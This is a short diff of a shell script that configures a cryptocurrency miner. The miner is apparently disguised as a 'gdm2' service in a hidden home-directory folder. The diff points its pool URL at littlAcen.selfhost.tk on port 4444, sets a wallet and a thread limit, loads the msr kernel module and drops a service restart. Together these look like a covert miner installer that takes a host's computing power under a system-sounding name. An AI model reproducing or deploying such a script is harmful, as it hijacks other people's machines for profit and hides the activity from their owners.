@@ -313,7 +313,7 @@ EOL
   fi
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:3333",/' $HOME/.gdm2/config.json
+sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:4444",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "hv",/' $HOME/.gdm2/config.json
 sed -i 's/"tls-fingerprint": null,/"tls-fingerprint": null,/' $HOME/.gdm2/config.json
@@ -340,8 +340,6 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config.json"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
 fi
-
-systemctl restart gdm2
 
 modprobe msr
 
